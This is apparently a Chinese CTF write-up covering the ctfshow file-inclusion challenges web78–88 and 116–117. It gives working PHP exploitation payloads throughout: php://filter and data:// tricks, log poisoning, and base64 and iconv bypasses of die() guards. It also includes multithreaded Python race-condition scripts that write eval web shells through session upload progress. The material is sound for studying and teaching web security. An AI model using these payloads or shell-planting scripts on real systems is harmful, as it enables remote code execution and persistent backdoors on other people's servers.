---
title: ctfshow文件包含
date: 2021-08-12 13:18:06
tags: [web,ctfshow]
categories: CTF
---

本篇记录下文件包含这一部分的WP，感觉学到很多，收获颇丰。

<!-- more -->

# 文件包含

## web78

```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file);
}else{
    highlight_file(__FILE__);
}
```

用`php://filter`伪协议读源码再进行解码，`payload：/?file=php://filter/convert.base64-encode/resource=flag.php`

## web79

```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);//将字符php替换成???
    include($file);
}else{
    highlight_file(__FILE__);
}
```

不能有php字符，但文件后缀有php，立刻想到了shell下的通配符，于是用`data://`伪协议，同样，php标识用短标签绕过，`payload：/?file=data://text/plain,<?=system('cat fl*');?>`，这里还可以用base64编码绕过

## web80

```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);//data,php字符被替换成???
    include($file);
}else{
    highlight_file(__FILE__);
}
```

data字符也被替换了，那么data伪协议不可用，这时想到了`php://input`协议，让include包含post的数据，正好伪协议里的字符php大小写都可，所以这里可以大小写绕过

```
/?file=PHP://input
post:<?php system('ls'); ?>                 //发现文件改名了，fl0g.php
     <?php system('cat fl0g.php'); ?>
```

## web81

```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```

冒号都被过滤了，伪协议都不能用了，这时想到用日志包含写入shell，于是进行下列操作拿flag

```
/?file=/var/log/nginx/access.log
User-Agent: <?php eval($_POST[1]); ?>
post:1=system('cat fl0g.php');
```

## web82

```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```

连`.`也过滤了，日志包含也不行了，不用`.`，包含的文件无后缀，那就只有session包含了，这里可以用BP或写脚本。

```html
<!DOCTYPE html>
<html>
<body>
<form action="http://1355e83a-813f-42a0-a07d-3a1621b7f6c1.challenge.ctf.show:8080/" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
    <input type="file" name="file" />
    <input type="submit" value="submit" />
</form>
</body>
</html>
```

首先POST发包，上传文件随意，主要是为了传PHP_SESSION_UPLOAD_PROGRESS的内容，然后添加`Cookie: PHPSESSID=flag`，并且在PHP_SESSION_UPLOAD_PROGRESS添加`<?php system('ls'); ?>`，如图所示

![image-20210720140038331](https://raw.githubusercontent.com/BkingXD/CTF-Web-/main/images/image-20210720140038331.png)

我们在Cookie里设置`PHPSESSID=flag`，PHP将会在服务器上创建一个文件——`/tmp/sess_flag`，所以我们需要发的另一个包为访问该文件，如图所示，下面添加的a只是方便爆破

![image-20210720140949414](https://raw.githubusercontent.com/BkingXD/CTF-Web-/main/images/image-20210720140949414.png)

设置爆破200次，线程数为5，同时发两个包，访问文件结果如下

![image-20210720141348381](https://raw.githubusercontent.com/BkingXD/CTF-Web-/main/images/image-20210720141348381.png)

发现`fl0g.php`这个文件，接下来就是更改命令，再重复一次操作就可以了。

这里也可以写脚本，因为不会python的多线程，就放一下其他大佬的脚本

```python
import io
import requests
import threading
url = 'http://1355e83a-813f-42a0-a07d-3a1621b7f6c1.challenge.ctf.show:8080/'

def write(session):
    data = {
        'PHP_SESSION_UPLOAD_PROGRESS': '<?php system("cat fl*");?>king'
    }
    while True:
        f = io.BytesIO(b'a' * 1024 * 10)
        response = session.post(url,cookies={'PHPSESSID': 'flag'}, data=data, files={'file': ('king.txt', f)})
def read(session):
    while True:
        response = session.get(url+'?file=/tmp/sess_flag')
        if 'king' in response.text:
            print(response.text)
            break
        else:
            print('1111')

if __name__ == '__main__':
    session = requests.session()
    write = threading.Thread(target=write, args=(session,))
    write.daemon = True
    write.start()
    read(session)
```

总结一下，这道题利用PHP_SESSION_UPLOAD_PROGRESS，将shell写入session，又利用在Cookie里设置`PHPSESSID=flag`，PHP将会在服务器上创建一个文件——`/tmp/sess_flag`，从而知道session文件的路径，但是默认配置`session.upload_progress.cleanup = on`导致文件上传后，session文件内容立即清空，所以这里又用条件竞争进行文件包含。

## web83

```php
Warning: session_destroy(): Trying to destroy uninitialized session in /var/www/html/index.php on line 14
<?php
session_unset();//释放当前在内存中已经创建的所有$_SESSION变量，但是不删除session文件以及不释放对应的session id
session_destroy();//删除当前用户对应的session文件以及释放session id，内存中$_SESSION变量内容依然保留

if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```

同样利用上一题的方法，学习了python的threading模块，自己写了个脚本，如下

```python
import threading
import requests
import io


url="http://a49a9ef0-c689-4c0a-80f2-b24041c7b733.challenge.ctf.show:8080/"
session_id='flag'

def write(session):
    data={
        'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST[1]);?>'
    }
    while True:
        filebytes=io.BytesIO(b'a' * 1024 * 5)#建立一个5kb的文件
        response=session.post(url,data=data,cookies={'PHPSESSID':session_id},files={'file':('king.txt',filebytes)})


def read(session):
    datas={
        "1":"file_put_contents('/var/www/html/2.php','<?php eval($_POST[2]); ?>');"
    }#用来生成一个shell文件，即使session文件被删除，还可以利用这个shell
    while True:
        responses=session.post(url=url+'?file=/tmp/sess_'+session_id,data=datas,cookies={'PHPSESSID':session_id})
        response2=session.get(url+'2.php')#判断是否生成了shell文件
        if response2.status_code==200:
            print('success')
            break
        else:
            print(response2.status_code)


if __name__ == '__main__':
    event=threading.Event()
    with requests.session() as session:#seesion=requests.session()
        for i in range(10):
            threading.Thread(target=write,args=(session,)).start()
        for i in range(10):
            threading.Thread(target=read,args=(session,)).start()
    event.set()
```

这次脚本相较上一个，进行了一个创建文件写入shell的操作，再利用这个文件，就可以进行任意命令执行。

## web84

```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    system("rm -rf /tmp/*");//删除tmp目录下的所有文件
    include($file);
}else{
    highlight_file(__FILE__);
}
```

还可以利用上一题的脚本，方法同上题一样。

这里解释一下，为什么进行了删除文件的操作，还是能包含session文件。在执行`system`和`include`两个语句之间存在一个时间间隔(CPU时间？)，利用多线程，就可做到，在一个线程执行完`system`，还未开始执行`include`时，另一个线程将session文件写入，这样就能做到包含文件了。上题原理相同

## web85

```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    if(file_exists($file)){
        $content = file_get_contents($file);
        if(strpos($content, "<")>0){
            die("error");//检测写入的session文件是否有'<'
        }
        include($file);
    }
    
}else{
    highlight_file(__FILE__);
}
```

一开始尝试不用`<`绕过，采用data协议base64编码，发现不行，原因就是以前使用这个协议都是传参，直接包含，在`<?php ?>`里面，而此时是写入一个文件里面，再包含这个文件，文件里没有php头。这里还是用上题相同脚本，如果跑不出来就扩大线程数，原理类似，if检测到文件为空(内容被清空，但文件还在)，准备执行include时，另一个线程刚写入内容，成功包含。

## web86

```php
<?php
define('还要秀？', dirname(__FILE__));
set_include_path(还要秀？);
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    include($file);   
}else{
    highlight_file(__FILE__);
}
```

加了个包含路径，没什么影响，解法同上一题。

## web87

```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $content = $_POST['content'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    file_put_contents(urldecode($file), "<?php die('大佬别秀了');?>".$content);
}else{
    highlight_file(__FILE__);
}
```

将`die()`和`$content`的内容写入文件`$file`，显然`$content`应该要写入一个shell，但先执行了前面的`die()`，导致执行不了后面的代码，所以要想办法让前面的代码不执行，这里就想到了用`php://filter`写文件，`/?file=php://filter/write=convert.base64-decode/resource=2.php`，这里进行解码，`die()`解码后就无法执行了，

> 这里还可以用rot13解码，但要注意“<?”并没有分解掉，这时，如果服务器开启了短标签，那么就会被解析

这里`$file`进行了urldecode，`$_GET`也要解一次码，所以这里对参数进行两次编码，要全编码，一般urlencode数字字母不编码，这里要绕过检测，

```
php://filter/write=convert.base64-decode/resource=2.php
2次urlencode后：
%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%32%25%32%65%25%37%30%25%36%38%25%37%30
```

`$content`传入编码后的`<?php eval($_POST[2]); ?>`，这里要注意前面的代码解码后只剩下6个字符，为了令后面代码不受影响需要再加2个字符变8个，因为base64算法解码时是4个byte一组，

```
content=XXPD9waHAgZXZhbCgkX1BPU1RbMl0pOyA/Pg==
```

最后访问文件，便可以任意命令执行。

## web88

```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    if(preg_match("/php|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\-|\_|\+|\=|\./i", $file)){
        die("error");
    }
    include($file);
}else{
    highlight_file(__FILE__);
}
```

这里php被过滤，php伪协议不能用，好像可以用data协议，要进行编码，于是尝试，

```
/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/Pg==     <?php system('ls'); ?>
/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/PlhY     <?php system('ls'); ?>XX
```

发现等号被过滤了，所以只要base64编码后无等号就行，base64的`=`是补位，我们在后面任意添加`XX`，php标记已闭合，无影响，查看发现文件没变，

```
/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKTsgPz4=
<?php system('tac fl0g.php'); ?>
payload：
/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKTsgPz5Y
<?php system('tac fl0g.php'); ?>X
```

## 78-88总结

> 1.`php://filter/read=`读编码后的源码，再进行解码
>
> 2.`data://text/plain`写任意代码，可以编码进行绕过一些过滤
>
> 3.`php://input`用来二次传参，读取post的数据，绕过过滤
>
> 4.伪协议用不了，然后考虑日志包含写shell
>
> 5.以上全部过滤，还有session包含，利用条件竞争写入shell

## web116

打开靶机是一段视频，题目提示有misc的内容，于是先下载得到视频MP4文件，用010打开文件，在文件末尾发现如下，

![image-20210812121041056](https://raw.githubusercontent.com/BkingXD/CTF-Web-/main/images/image-20210812121041056.png)

这一般是PNG文件的文件尾，于是猜测这个MP4文藏了一张PNG图片，再找到PNG文件的文件头`89504E47`，将其截出保存，得到源码图片，如图

![image-20210812121440112](https://raw.githubusercontent.com/BkingXD/CTF-Web-/main/images/image-20210812121440112.png)

可以直接读取文件，构造payload：`/index.php?file=flag.php`，这里浏览器里操作无回显，BP抓包发送就能看到，因为是按MP4格式解析的，浏览器看不到。

## web117

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
function filter($x){
    if(preg_match('/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i',$x)){
        die('too young too simple sometimes naive!');
    }
}
$file=$_GET['file'];
$contents=$_POST['contents'];
filter($file);
file_put_contents($file, "<?php die();?>".$contents);
```

与87题有点类似，绕过`die()`死亡代码，但这里过滤了很多，rot13，base64都用不了，有篇文章讲的很详细——[file_put_content和死亡·杂糅代码之缘](https://xz.aliyun.com/t/8163#toc-11)。这里采用`convert.iconv.`这个过滤器

> convert.iconv.：一种过滤器，和使用iconv()函数处理流数据有等同作用
> `iconv ( string $in_charset , string $out_charset , string $str )`：将字符串`$str`从`in_charset`编码转换到`$out_charset`

```php
<?php  
$str='<?php eval($_POST[2]) ?>';
$a=iconv('UCS-2LE','UCS-2BE',$str);
echo $a;
?> //?<hp pvela$(P_SO[T]2 )>?

GET ?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=2.php
POST contents=?<hp pvela$(P_SO[T]2 )>?
```

shell已经写入，然后可以rce了。

